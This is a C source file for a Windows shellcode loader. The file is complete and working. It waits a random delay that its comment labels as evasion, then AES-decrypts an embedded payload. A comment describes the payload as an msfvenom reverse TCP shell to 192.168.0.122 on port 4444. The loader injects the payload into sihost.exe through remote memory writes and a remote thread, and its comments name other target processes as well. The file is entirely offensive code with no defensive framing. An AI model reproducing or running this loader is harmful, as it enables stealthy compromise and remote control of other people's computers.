#include <stdio.h>
#include <Windows.h>
#include <bcrypt.h>
#include <Tlhelp32.h>

#pragma comment(lib, "bcrypt.lib")

#define NT_SUCCESS(status) (((NTSTATUS)(status)) >= 0)
#define KEYSIZE 32
#define IVSIZE 16

typedef struct _AES {
    PBYTE   pPlainText;             // base address of the plain text data
    DWORD   dwPlainSize;            // size of the plain text data

    PBYTE   pCipherText;            // base address of the encrypted data
    DWORD   dwCipherSize;           // size of it (this can change from dwPlainSize in case there was padding)

    PBYTE   pKey;                   // the 32 byte key
    PBYTE   pIv;                    // the 16 byte iv
}AES, * PAES;

//sleep for rand sec
void SleepTightRand(int minSeconds, int maxSeconds) 
{
    srand(time(NULL));
    int randomDelay = (rand() % (maxSeconds - minSeconds + 1) + minSeconds) * 1000; //recount to milliseconds
    //printf("[DEBUG] Waiting for %i seconds...\n", randomDelay / 1000);
    HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    DWORD waitResult = WaitForSingleObjectEx(hEvent, randomDelay, TRUE);
    CloseHandle(hEvent);
}

// the real decryption implemantation
BOOL InstallAesDecryption(PAES pAes) {

    BOOL                            bSTATE = TRUE;

    BCRYPT_ALG_HANDLE               hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE               hKeyHandle = NULL;

    ULONG                           cbResult = NULL;
    DWORD                           dwBlockSize = NULL;

    DWORD                           cbKeyObject = NULL;
    PBYTE                           pbKeyObject = NULL;

    PBYTE                           pbPlainText = NULL;
    DWORD                           cbPlainText = NULL;

    NTSTATUS                        STATUS = NULL;

    // intializing "hAlgorithm" as AES algorithm Handle
    STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // getting the size of the key object variable *pbKeyObject* this is used for BCryptGenerateSymmetricKey function later
    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // getting the size of the block used in the encryption, since this is aes it should be 16 (this is what AES does)
    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // checking if block size is 16
    if (dwBlockSize != 16) {
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // allocating memory for the key object
    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (pbKeyObject == NULL) {
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // setting Block Cipher Mode to CBC (32 byte key and 16 byte Iv)
    STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // generating the key object from the aes key "pAes->pKey", the output will be saved in "pbKeyObject" of size "cbKeyObject"
    STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // running BCryptDecrypt first time with NULL output parameters, thats to deduce the size of the output buffer, (the size will be saved in cbPlainText)
    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptDecrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // allocating enough memory (of size cbPlainText)
    pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
    if (pbPlainText == NULL) {
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // running BCryptDecrypt second time with "pbPlainText" as output buffer
    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptDecrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // cleaning up
_EndOfFunc:
    if (hKeyHandle) {
        BCryptDestroyKey(hKeyHandle);
    }
    if (hAlgorithm) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    }
    if (pbKeyObject) {
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
    }
    if (pbPlainText != NULL && bSTATE) {
        // if everything went well, we save pbPlainText and cbPlainText
        pAes->pPlainText = pbPlainText;
        pAes->dwPlainSize = cbPlainText;
    }
    return bSTATE;
}

// wrapper function for InstallAesDecryption that make things easier
BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {
    if (pCipherTextData == NULL || sCipherTextSize == NULL || pKey == NULL || pIv == NULL)
        return FALSE;

    AES Aes = {
            .pKey = pKey,
            .pIv = pIv,
            .pCipherText = pCipherTextData,
            .dwCipherSize = sCipherTextSize
    };

    if (!InstallAesDecryption(&Aes)) {
        return FALSE;
    }

    *pPlainTextData = Aes.pPlainText;
    *sPlainTextSize = Aes.dwPlainSize;

    return TRUE;
}

//msfvenom reverse_tcp 192.168.0.122 4444 I hate AES
unsigned char AesCipherText[] = {
        0x0F, 0x98, 0x4D, 0x5C, 0x26, 0x48, 0x99, 0xA6, 0x64, 0x9B, 0xFE, 0x43, 0xBA, 0x5E, 0x75, 0x7D,
        0xA0, 0x71, 0xBB, 0x45, 0x73, 0x10, 0x8F, 0xA3, 0x6C, 0xEC, 0x02, 0x2A, 0x83, 0x50, 0x32, 0x7E,
        0x94, 0x25, 0x31, 0x28, 0xE3, 0xCE, 0x6A, 0x2F, 0x54, 0x30, 0x05, 0x89, 0x6B, 0x28, 0xA9, 0x94,
        0x6E, 0x89, 0x42, 0xC1, 0x67, 0x1C, 0x66, 0x8B, 0x26, 0x6E, 0x53, 0xFD, 0x4E, 0x0A, 0x6D, 0x9B,
        0xEC, 0x9E, 0xFB, 0x2B, 0x10, 0x82, 0x22, 0x30, 0x2F, 0x84, 0xDA, 0x69, 0x26, 0x66, 0xEF, 0x8B,
        0x48, 0xE5, 0xC2, 0x7B, 0x41, 0xF9, 0x98, 0xE0, 0xB8, 0xC9, 0x4E, 0xD0, 0xB3, 0xA0, 0xF5, 0x94,
        0xA4, 0x95, 0x82, 0x4C, 0x6B, 0x3D, 0xF6, 0xFB, 0x74, 0xD1, 0x20, 0xDB, 0xB3, 0x7D, 0x2C, 0x41,
        0x8F, 0x53, 0x48, 0xD0, 0x04, 0x9B, 0xF2, 0xBA, 0xFF, 0x43, 0xE8, 0xA3, 0xC3, 0x13, 0x62, 0x1B,
        0x8A, 0x40, 0x27, 0xCC, 0xDE, 0xDA, 0x69, 0x61, 0x18, 0xE7, 0x6F, 0x4E, 0x1F, 0x00, 0xF1, 0xB2,
        0x07, 0x5B, 0x90, 0x83, 0xC7, 0xC7, 0xD8, 0x7A, 0xD1, 0xEE, 0x12, 0x36, 0xED, 0x1F, 0x73, 0xB4,
        0x68, 0xC0, 0x1E, 0xF7, 0xCE, 0x0C, 0x7E, 0x8F, 0xF9, 0x15, 0xD3, 0x34, 0x62, 0xF7, 0x8B, 0x39,
        0x2F, 0xAE, 0xC2, 0xC6, 0xCF, 0x2E, 0x3F, 0xF5, 0x33, 0x64, 0xEC, 0x50, 0xD9, 0x8A, 0xED, 0x76,
        0xD6, 0x19, 0xBC, 0x7A, 0x8B, 0x1E, 0x8A, 0x8F, 0x0B, 0x1A, 0x91, 0x2A, 0xCA, 0x38, 0x12, 0x0B,
        0xD1, 0xB5, 0xFC, 0x28, 0xFB, 0x02, 0x43, 0x9D, 0x24, 0x46, 0xAD, 0x9E, 0x82, 0x7F, 0x7F, 0x12,
        0x0D, 0x63, 0xFB, 0x5B, 0x85, 0x85, 0xC2, 0x46, 0x2B, 0x16, 0x70, 0x6A, 0x02, 0x03, 0x8E, 0x52,
        0xE9, 0x45, 0x3B, 0xA8, 0xE6, 0x81, 0x1D, 0x36, 0x70, 0xB4, 0xDB, 0x9E, 0xE5, 0x9E, 0x88, 0x20,
        0xCF, 0x51, 0x6E, 0x05, 0xE6, 0xE0, 0x51, 0xD1, 0x97, 0xB5, 0x09, 0x67, 0xAE, 0xAE, 0x50, 0xDD,
        0x9B, 0x6B, 0xC9, 0xB9, 0x9A, 0x54, 0x72, 0xFD, 0x08, 0x2E, 0x7A, 0x5A, 0x76, 0x86, 0xE9, 0x77,
        0xA9, 0x5C, 0x0D, 0x42, 0x8A, 0x6C, 0x83, 0x80, 0x21, 0x6C, 0x16, 0xA3, 0x63, 0x36, 0xEC, 0x5D,
        0x7F, 0x60, 0xC6, 0x01, 0xB8, 0x4F, 0xBD, 0x99, 0x0C, 0xFF, 0x05, 0xBA, 0xA1, 0x36, 0xF4, 0xCF,
        0xB8, 0xA9, 0x68, 0x4A, 0x71, 0x2F, 0x0B, 0xA1, 0x05, 0x62, 0x4E, 0x95, 0xE6, 0x1B, 0x60, 0x95,
        0xA5, 0xD4, 0x90, 0x1F, 0x3C, 0x57, 0xC4, 0x39, 0xB6, 0x4F, 0x25, 0x14, 0xFB, 0xC0, 0x46, 0xE3,
        0x65, 0x65, 0xC4, 0x70, 0x88, 0xEF, 0x2A, 0x4B, 0x0B, 0x2C, 0x83, 0xB4, 0x31, 0xDF, 0xAF, 0xBB,
        0xDE, 0xAD, 0x1F, 0x1E, 0x2A, 0x47, 0xD7, 0xE7, 0xFE, 0x57, 0x49, 0x09, 0x73, 0x5F, 0xB7, 0x2D,
        0xF1, 0x9B, 0xC5, 0xC7, 0x47, 0xF2, 0x7F, 0xE1, 0x77, 0x71, 0x74, 0xCF, 0xAD, 0x92, 0x4D, 0x92,
        0xF3, 0xAD, 0x8A, 0x18, 0x84, 0x2D, 0x77, 0x23, 0x33, 0x3E, 0xA0, 0xAD, 0x16, 0xCA, 0x51, 0x6E,
        0xFE, 0x0C, 0x9B, 0x9A, 0x44, 0x13, 0xE9, 0x16, 0x58, 0xB9, 0xDE, 0xB4, 0x27, 0x36, 0x95, 0x90,
        0x77, 0x14, 0x68, 0x7C, 0x97, 0xD5, 0xCA, 0x3A, 0x93, 0x8B, 0xB6, 0x99, 0x89, 0xFA, 0xFF, 0xF4,
        0x9E, 0x68, 0x60, 0x9F, 0x0B, 0x64, 0x68, 0x50, 0x24, 0x3D, 0xA5, 0x10, 0x6C, 0xEE, 0xAA, 0xEA };


unsigned char AesKey[] = {
        0x85, 0x35, 0x00, 0xC2, 0x0B, 0xA8, 0xD4, 0xF2, 0xA3, 0xA1, 0xE3, 0x1D, 0x5E, 0x00, 0x57, 0x4F,
        0x64, 0x5C, 0x3D, 0xEC, 0xDA, 0x52, 0x8E, 0xA1, 0x09, 0x1D, 0x69, 0x9A, 0xBC, 0x67, 0xA0, 0xF5 };


unsigned char AesIv[] = {
        0x4D, 0x86, 0xFC, 0x2C, 0x14, 0x65, 0x00, 0x76, 0x70, 0xE0, 0x27, 0x7A, 0x3C, 0x31, 0x52, 0xE1 };

//get the handle for injection
BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {

    HANDLE			hSnapShot = NULL;
    PROCESSENTRY32	Proc = {
                    .dwSize = sizeof(PROCESSENTRY32)
    };

    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
        goto _EndOfFunction;
    }

    if (!Process32First(hSnapShot, &Proc)) {
        printf("[!] Process32First Failed With Error : %d \n", GetLastError());
        goto _EndOfFunction;
    }

    do {

        WCHAR LowerName[MAX_PATH * 2];

        if (Proc.szExeFile) {

            DWORD	dwSize = lstrlenW(Proc.szExeFile);
            DWORD   i = 0;
            RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

            if (dwSize < MAX_PATH * 2) {
                for (; i < dwSize; i++)
                    LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);
                LowerName[i++] = '\0';
            }
        }

        if (wcscmp(LowerName, szProcessName) == 0) {
            *dwProcessId = Proc.th32ProcessID;
            *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
            if (*hProcess == NULL)
                printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());
            break;
        }
    } while (Process32Next(hSnapShot, &Proc));


_EndOfFunction:
    if (hSnapShot != NULL)
        CloseHandle(hSnapShot);
    if (*dwProcessId == NULL || *hProcess == NULL)
        return FALSE;
    return TRUE;
}

//injection part
BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {

    PVOID	pShellcodeAddress = NULL;
    SIZE_T	sNumberOfBytesWritten = NULL;
    DWORD	dwOldProtection = NULL;

    pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
        printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    memset(pShellcode, '\0', sSizeOfShellcode);

    if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

int main()
{
    PVOID	pPlaintext = NULL;
    DWORD	dwPlainSize = NULL;
    SIZE_T	PayloadSize = NULL;
    PBYTE	PayloadBytes = NULL;
    HANDLE  hProcess = NULL;
    DWORD   dwProcessId = NULL;

    //sleep for random seconds (define below) for evasion 
    DWORD minSeconds = 2;
    DWORD maxSeconds = 6;
    SleepTightRand(minSeconds, maxSeconds);

    // AES decryption
    if (!SimpleDecryption(AesCipherText, sizeof(AesCipherText), AesKey, AesIv, &pPlaintext, &dwPlainSize)) {
        return -1;
    }

    //target for injection - sihost.exe is starting with W10 on default
    //another options: msedge.exe, RuntimeBroker.exe, sihost.exe (restarts explorer on exit but most stable), explorer.exe, smartscreen.exe
    LPCWSTR InjectVictim = L"sihost.exe";
    GetRemoteProcessHandle(InjectVictim, &dwProcessId, &hProcess);
    InjectShellcodeToRemoteProcess(hProcess, pPlaintext, dwPlainSize);

    HeapFree(GetProcessHeap(), 0, pPlaintext);
    return 0;
}


